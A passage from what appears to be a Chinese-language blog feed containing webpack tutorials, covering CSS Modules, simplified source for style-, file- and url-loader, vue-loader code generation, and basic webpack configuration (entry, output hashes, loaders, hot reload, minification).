class="line"><span class="regexp">  color: red;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>Webpack将<em><code>style.title</code></em>编译成一个哈希字符串，App.css也会同时被编译。要开启Css Module编译，需要在webpack配置上加上<code>css-loader?modules</code>。CSS Modules 允许使用<code>:global(.className)</code>的语法，声明一个全局规则。凡是这样声明的<code>class</code>，都不会被编译成哈希字符串。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"_3zyde4l1yATCOkgn-DBWEL"</span>&gt;</span></span><br><span class="line">  Hello World</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">._3zyde4l1yATCOkgn-DBWEL &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>Q: 使用css-module后，antd的样式就失效了，该怎么解决？</em><br><strong>A: 针对 antd 或其他依赖包的 css 单独写一条 loader 的规则，不开启 css modules 即可</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 针对antd不开启CSS Modules处理</span></span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">  include: [<span class="regexp">/[\\/]node_modules[\\/].*antd/</span>],</span><br><span class="line">  use: [</span><br><span class="line">    &#123;<span class="attr">loader</span>: <span class="string">'style-loader'</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">loader</span>: <span class="string">'css-loader'</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-sass-resources-loader-全局样式变量"><a href="#3-2-sass-resources-loader-全局样式变量" class="headerlink" title="3.2 sass-resources-loader: 全局样式变量"></a>3.2 sass-resources-loader: 全局样式变量</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 引入全局样式</span></span><br><span class="line">  loader: <span class="string">'sass-resources-loader'</span>,</span><br><span class="line">  options: &#123;</span><br><span class="line">    resources: [</span><br><span class="line">      resolve(<span class="string">'src/styles/_variables.scss'</span>),</span><br><span class="line">      resolve(<span class="string">'src/styles/_mixins.scss'</span>),</span><br><span class="line">      resolve(<span class="string">'src/styles/_functions.scss'</span>)</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-style-loader"><a href="#4-style-loader" class="headerlink" title="4. style-loader"></a>4. style-loader</h3><p>把样式插入到DOM中，在head中插入一个style标签，并把样式写入到这个标签的innerHTML<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports.pitch = <span class="function"><span class="keyword">function</span> (<span class="params">request</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [</span><br><span class="line">    <span class="string">'var content=require('</span> + loaderUtils.stringifyRequest(<span class="keyword">this</span>, <span class="string">'!!'</span> + request) + <span class="string">')’, // 得到 css 内容</span></span><br><span class="line"><span class="string">    '</span><span class="built_in">require</span>(<span class="string">' + loaderUtils.stringifyRequest(this, '</span>!<span class="string">' + path.join(__dirname, "add-style.js")) + '</span>)(content)’, <span class="comment">// 调用  addStyle 把CSS内容插入到DOM中</span></span><br><span class="line">    <span class="string">'if(content.locals) module.exports = content.locals’ // 如果发现启用了 css modules，则默认导出它</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">  return result.join('</span>;<span class="string">')</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">module.exports = function (content) &#123;</span></span><br><span class="line"><span class="string">  var style = document.createElement('</span>style<span class="string">')</span></span><br><span class="line"><span class="string">  style.innerHTML = content</span></span><br><span class="line"><span class="string">  document.head.appendChild(style)</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-file-loader"><a href="#5-file-loader" class="headerlink" title="5. file-loader"></a>5. file-loader</h3><p><code>file-loader</code>根据配置和文件内容生成一个唯一的文件名，复制文件内容到dist指定目录。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loaderUtils = <span class="built_in">require</span>(<span class="string">'loader-utils'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">content</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 获取webpack对file-loader的配置，&#123; name: "[name]_[hash].[ext]" &#125;</span></span><br><span class="line">  <span class="keyword">const</span> options = loaderUtils.getOptions(<span class="keyword">this</span>) || &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// loaderUtils的一个方法，可以根据name配置和content内容生成一个文件名</span></span><br><span class="line">  <span class="comment">// 为什么需要文件内容？为了保证文件内容没有发生变化时，名字中的[hash]字段也不会变</span></span><br><span class="line">  <span class="keyword">let</span> url = loaderUtils.interpolateName(<span class="keyword">this</span>, options.name, &#123; content &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 告诉webpack，我要创建一个文件，webpack会帮你在dist目录下创建对应的文件</span></span><br><span class="line">  <span class="keyword">this</span>.emitFile(url, content)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// __webpack_public_path__是public的跟路径</span></span><br><span class="line">  <span class="comment">// css这样写: background-image: url('a.png')</span></span><br><span class="line">  <span class="comment">// 编译后变成: background-image: require('xx/xxxxx.png')</span></span><br><span class="line">  <span class="comment">// 下面返回的结果，就是图片的路径</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'module.exports= __webpack_public_path__ + '</span> + <span class="built_in">JSON</span>.stringify(url)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认情况下，webpack会把文件内容当做UTF-8字符串处理</span></span><br><span class="line"><span class="comment">// 我们需要指定webpack用raw-loader来加载文件</span></span><br><span class="line"><span class="built_in">module</span>.exports.raw = <span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-url-loader"><a href="#6-url-loader" class="headerlink" title="6. url-loader"></a>6. url-loader</h3><p><code>url-loader</code>把文件(Buffer)转成base64编码，直接嵌入到CSS/JS/HTML中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">content</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> options = loaderUtils.getOptions(<span class="keyword">this</span>) || &#123;&#125;</span><br><span class="line">  <span class="keyword">var</span> limit = options.limit || (<span class="keyword">this</span>.options &amp;&amp; <span class="keyword">this</span>.options.url &amp;&amp; <span class="keyword">this</span>.options.url.dataUrlLimit)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (limit) &#123;</span><br><span class="line">    limit = <span class="built_in">parseInt</span>(limit, <span class="number">10</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> mimetype = options.mimetype || options.minetype || mime.lookup(<span class="keyword">this</span>.resourcePath)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// No limits or limit more that content length</span></span><br><span class="line">  <span class="keyword">if</span> (!limit || content.length &lt; limit) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> content === <span class="string">'string'</span>) &#123;</span><br><span class="line">      content = <span class="keyword">new</span> Buffer(content)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'module.exports = '</span> + <span class="built_in">JSON</span>.stringify(<span class="string">'data'</span> + (mimetype ? mimetype + <span class="string">';'</span> : <span class="string">''</span>) + <span class="string">'base64,'</span> + content.toString(<span class="string">'base64'</span>))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果超过了文件大小限制，调用file-loader来加载</span></span><br><span class="line">  <span class="keyword">var</span> fallback = options.fallback || <span class="string">'file-loader'</span></span><br><span class="line">  <span class="keyword">var</span> fallbackLoader = <span class="built_in">require</span>(fallback)</span><br><span class="line">  <span class="keyword">return</span> fallbackLoader.call(<span class="keyword">this</span>, content)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports.raw = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="7-raw-loader"><a href="#7-raw-loader" class="headerlink" title="7. raw-loader"></a>7. raw-loader</h3><p><br></p><h3 id="8-vue-loader"><a href="#8-vue-loader" class="headerlink" title="8. vue-loader"></a>8. vue-loader</h3><p>编译以单文件组件的格式撰写 Vue 组件。解析 .vue 中的 <code>template</code>、<code>script</code>、<code>style</code> 后，分别构造一个 import 字符串，然后拼接。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">templateImport = <span class="string">"import &#123; render, staticRenderFns &#125; from './App.vue?vue&amp;type=template&amp;id=7ba5bd90&amp;'"</span>;</span><br><span class="line"></span><br><span class="line">scriptImport = <span class="string">"import script from './App.vue?vue&amp;type=script&amp;lang=js&amp;'</span></span><br><span class="line"><span class="string">                export * from './App.vue?vue&amp;type=script&amp;lang=js&amp;'"</span>;</span><br><span class="line"></span><br><span class="line">stylesCode = <span class="string">"import style from './App.vue?vue&amp;type=style&amp;index=0&amp;lang=scss&amp;'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> code = <span class="string">`</span></span><br><span class="line"><span class="string"><span class="subst">$&#123;templateImport&#125;</span></span></span><br><span class="line"><span class="string"><span class="subst">$&#123;scriptImport&#125;</span></span></span><br><span class="line"><span class="string"><span class="subst">$&#123;stylesCode&#125;</span>`</span>.trim() + <span class="string">`\n`</span></span><br><span class="line">code += <span class="string">`\nexport default component.exports`</span></span><br><span class="line"><span class="keyword">return</span> code</span><br></pre></td></tr></table></figure><p>生成的 code：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">"</span></span><br><span class="line"><span class="string">import &#123; render, staticRenderFns &#125; from './App.vue?vue&amp;type=template&amp;id=7ba5bd90&amp;'</span></span><br><span class="line"><span class="string">import script from './App.vue?vue&amp;type=script&amp;lang=js&amp;'</span></span><br><span class="line"><span class="string">export * from './App.vue?vue&amp;type=script&amp;lang=js&amp;'</span></span><br><span class="line"><span class="string">import style0 from './App.vue?vue&amp;type=style&amp;index=0&amp;lang=scss&amp;'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 省略 ...</span></span><br><span class="line"><span class="string">export default component.exports"</span></span><br></pre></td></tr></table></figure></p><h4 id="8-1-CSS-Scoped实现原理"><a href="#8-1-CSS-Scoped实现原理" class="headerlink" title="8.1 CSS Scoped实现原理"></a>8.1 CSS Scoped实现原理</h4><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://github.com/lihongxun945/diving-into-webpack" target="_blank" rel="noopener">Webpack 源码解析</a></li><li><a href="https://github.com/lihongxun945/my-webpack-loader" target="_blank" rel="noopener">My-webpack-loader: Show how to write your own loader</a></li><li><a href="https://vue-loader.vuejs.org/zh/#vue-loader-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F" target="_blank" rel="noopener">Vue-loader</a></li><li><a href="https://juejin.cn/post/6844903949900742670" target="_blank" rel="noopener">从vue-loader源码分析CSS Scoped的实现</a></li><li><a href="https://www.ruanyifeng.com/blog/2016/06/css_modules.html" target="_blank" rel="noopener">CSS Modules 用法教程</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Webpack 用法</title>
      <link href="/2021/11/14/webpack/"/>
      <url>/2021/11/14/webpack/</url>
      <content type="html"><![CDATA[<h3 id="为什么需要-Webpack？"><a href="#为什么需要-Webpack？" class="headerlink" title="为什么需要 Webpack？"></a>为什么需要 Webpack？</h3><ul><li>多终端应用场景，需要不同的打包配置。如：React native移动端、web端、服务端渲染打包</li><li>npm 是 JS 的包管理系统，但 npm 包不能在 js 中直接引用</li><li>React, Vue, less, CssModules 等语法在浏览器中无法直接解析</li></ul><p><br></p><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h3><p>webpack 是一个静态模块打包工具。当 webpack 处理程序时，它会在内部从一个或多个入口点构建一个 依赖图(dependency graph)，然后将你项目中所需的每一个模块组合成一个或多个 bundles，它们均为静态资源，用于展示你的网页。</p><h4 id="1-1-安装运行"><a href="#1-1-安装运行" class="headerlink" title="1.1 安装运行"></a>1.1 安装运行</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install webpack webpack-cli --save-dev</span><br><span class="line">./node_modules/.bin/webpack -v</span><br></pre></td></tr></table></figure><p>通过 npm script 运行 webpack</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripts: &#123; <span class="string">"build"</span>: <span class="string">"webpack --config prod.config.js"</span> &#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-2-基本组成"><a href="#1-2-基本组成" class="headerlink" title="1.2 基本组成"></a>1.2 基本组成</h4><ul><li><p>配置文件<br>默认配置是 webpack.config.js， 可以通过<code>webpack --config</code>指定配置文件</p></li><li><p>entry<br>通过入口文件寻找依赖，单入口 entry 是一个字符串，多入口 entry 是一个对象</p></li><li><p>output<br>指示webpack如何输出、以及在哪里输出你的bundle, asset和其他使用webpack载入的内容。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">output: &#123;</span><br><span class="line">  filename: <span class="string">'[name].[hash].bundle.js'</span>  <span class="comment">// 决定每个输出bundle的名称</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[hash]</code>: 和整个项目的构建有关，只要项目文件有修改，整个项目构建的 hash 值就会更改<br><code>[chunkhash]</code>: 和 webpack 打包的 chunk 有关，不同的 entry 会生成不同的 chunkhash 值<br><code>[contenthash]</code>: 根据文件内容来定义 hash， 文件内容不变，则 contenthash 不变</p><p><code>[ext]</code> 资源后缀名<br><code>[name]</code> 文件名称<br><code>[path]</code> 文件的相对路径<br><code>[folder]</code> 文件所在的文件夹</p></li><li><p>context<br>基础目录，绝对路径，用于从配置中解析入口起点</p></li><li><p>mode<br>指定当前构造环境的值是production | development | none。 或者用<code>webpack --mode=production</code>传递。默认值为 production，指定后会设置<code>process.end.NODE_ENV</code>为该值，并默认开启一些插件。</p></li><li><p>loader<br>webpack 开箱即用只支持 js 和 json 两种文件类型，通过 loaders 去支持其他文件类型并且把它们转换成有效的模块，并且可以添加到依赖图中。loader 本身是一个函数，接受源文件作为参数，返回转换的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test 指定匹配规则</span><br><span class="line">use 指定loader名称</span><br><span class="line">options 可选项</span><br><span class="line">include, exclude, oneOf 指定文件范围</span><br></pre></td></tr></table></figure></li><li><p>plugin<br>插件用于 bundle 文件的优化，资源管理和环境变量注入，作用于整个构建过程</p></li><li><p>devtool<br>选择一种source map源映射方式，方便调试。</p></li><li><p>devServer<br>配置代理</p></li><li><p>server<br>配置webserver</p></li></ul><p><br></p><h4 id="1-3-简写路径，新增模块目录"><a href="#1-3-简写路径，新增模块目录" class="headerlink" title="1.3 简写路径，新增模块目录"></a>1.3 简写路径，新增模块目录</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">resolve: &#123;</span><br><span class="line">  <span class="comment">// 配置简写路径</span></span><br><span class="line">  alias: &#123;</span><br><span class="line">    <span class="string">'@'</span>: path.join(__dirname, <span class="string">'..'</span>, <span class="string">'src'</span>)</span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="comment">// 增加一个模块搜索目录，此目录优先于 node_modules/</span></span><br><span class="line">  modules: [path.resolve(__dirname, <span class="string">'src'</span>), <span class="string">'node_modules'</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-4-optimization"><a href="#1-4-optimization" class="headerlink" title="1.4 optimization"></a>1.4 optimization</h4><p>webpack4开始，不同的mode会执行不同的优化，production与development的区别如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">optimization: &#123;</span><br><span class="line">  minimize: <span class="literal">true</span>,       <span class="comment">// 使用TerserPlugin压缩bundle</span></span><br><span class="line">  nameModules: <span class="literal">false</span>,   <span class="comment">// 使用可读取模块标识符，帮助更好滴调试</span></span><br><span class="line">  nameChunks: <span class="literal">false</span>,    <span class="comment">// 使用可读取chunk标识符</span></span><br><span class="line">  nodeEnv: <span class="string">'production'</span>,<span class="comment">// 将process.env.NODE_ENV设置为一个给定字符串</span></span><br><span class="line">  flagIncludedChunks: <span class="literal">false</span>,  <span class="comment">// 已经加载过较大的chunk之后，就不再去加载这些chunk子集</span></span><br><span class="line">  occurenceOrder: <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>常见的环境配置差异</p><ul><li>生产环境可能需要分离 CSS 成单独的文件，以便多个页面共享同一个 CSS 文件</li><li>生产环境需要压缩 HTML/CSS/JS 代码</li><li>生产环境需要压缩图片</li><li>开发环境需要生成 sourcemap 文件</li><li>开发环境需要打印 debug 信息</li><li>开发环境需要 live reload 或者 hot reload 的功能</li></ul><p><br></p><h3 id="2-loader-plugin"><a href="#2-loader-plugin" class="headerlink" title="2. loader + plugin"></a>2. loader + plugin</h3><h4 id="2-1-解析ES6、JSX"><a href="#2-1-解析ES6、JSX" class="headerlink" title="2.1 解析ES6、JSX"></a>2.1 解析ES6、JSX</h4><p><code>babel-loader</code>用于解析ES6, JSX语法, babel的配置文件是<code>.bablerc</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// npm i @babel/core @babel/preset-env babel-loader -D</span></span><br><span class="line">&#123; <span class="attr">text</span>: <span class="regexp">/\.js$/</span>, <span class="attr">use</span>: <span class="string">'bable-loader'</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .babelrc 文件</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"presets"</span>: [</span><br><span class="line"><span class="string">"@babel/preset-env"</span>, <span class="comment">// 解析 es6 语法</span></span><br><span class="line"><span class="string">"@babel/preset-react"</span> <span class="comment">// 解析 React JSX</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-解析CSS"><a href="#2-2-解析CSS" class="headerlink" title="2.2 解析CSS"></a>2.2 解析CSS</h4><p><code>css-loader</code>用于加载.css文件，并且转换成commonjs对象<br><code>style-loader</code>将样式通过<code>&lt;style&gt;</code>标签插入到head中<br><code>less-loader</code>将less转换成css<br><code>postcss-loader</code> CSS前缀自动补全, 支持cssModules<br><code>px2rem</code> px自动转换为rem</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// loader的执行是链式调用，执行顺序是从右到左。</span></span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(css|less)$/</span>,</span><br><span class="line">  use: [</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'style-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        insertAt: <span class="string">'top'</span>, <span class="comment">// 样式插入到&lt;head&gt;</span></span><br><span class="line">        singleton: <span class="literal">true</span>, <span class="comment">// 将所有的style标签合并成一个</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'css-loader'</span>,</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'postcss-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        plugins: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">require</span>(<span class="string">'autoprefixer'</span>)(&#123;</span><br><span class="line">            browser: [<span class="string">'last 2 version'</span>, <span class="string">'&gt;1%'</span>, <span class="string">'ios 7'</span>]</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'less-loader'</span>,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MiniCssExtractPlugin</code> 将样式提取到一个公共文件，注意它和 less-loader 的功能是互斥的，此时要去掉 less-loader。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将样式提取到公用文件</span></span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(css|less)$/</span>,</span><br><span class="line">  use: [</span><br><span class="line">    MiniCssExtractPlugin.loader,</span><br><span class="line">    <span class="string">'css-loader'</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">plugins: [</span><br><span class="line">  <span class="comment">// css文件压缩</span></span><br><span class="line">  <span class="keyword">new</span> OptimizeCSSAssetsPlugin(&#123;</span><br><span class="line">    assetNameRegExp: <span class="regexp">/.css$/g</span>,</span><br><span class="line">    cssProcessor: <span class="built_in">require</span>(<span class="string">'cssnano'</span>)</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">    filename: <span class="string">'[name]_[contenthash:8].css'</span></span><br><span class="line">  &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-解析图片字体"><a href="#2-3-解析图片字体" class="headerlink" title="2.3 解析图片字体"></a>2.3 解析图片字体</h4><p><code>file-loader</code>用于处理文件。<code>url-loader</code>可以将较小资源转换为base64<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(png|jpg|jpeg)$/</span>,</span><br><span class="line">  use: [&#123;</span><br><span class="line">    loader: <span class="string">'url-loader'</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      limit: <span class="number">10240</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(woff|woff2|ttf|eot|otf)$/</span>,</span><br><span class="line">  use: [&#123;</span><br><span class="line">    loader: <span class="string">'file-loader'</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      name: <span class="string">'assets/[name][hash:8].[ext]'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-热更新"><a href="#2-4-热更新" class="headerlink" title="2.4 热更新"></a>2.4 热更新</h4><p>文件监听是在发现源码变化时，自动重新构造出新的输出文件。webpack中开启监听模式，有两种方式</p><ul><li><code>webpack --watch</code></li><li>webpack.config.js中设置<code>watch: true</code></li></ul><p>虽然 webpack 会自动构建，但是浏览器不会自动更新</p><ul><li>webpack-dev-server，localhost 可访问页面</li><li>HotModuleReplacementPlugin 插件，不用手动刷新浏览器</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// npm install webpack-dev-server -D</span></span><br><span class="line"><span class="comment">// &#123; scripts: &#123; "dev": "webpack-dev-server --open" &#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"></span><br><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> webpack.HotModuleReplacementPlugin()</span><br><span class="line">],</span><br><span class="line">devServer: &#123;</span><br><span class="line">  contentBase: <span class="string">'./dist'</span>,</span><br><span class="line">  hot: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><p><br></p><h4 id="2-6-文件压缩"><a href="#2-6-文件压缩" class="headerlink" title="2.6 文件压缩"></a>2.6 文件压缩</h4><p><code>optimize-css-assets-webpack-plugin</code> CSS压缩<br><code>uglifyjs-webpack-plugin</code> JS压缩<br><code>html-webpack-plugin</code> HTML压缩</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 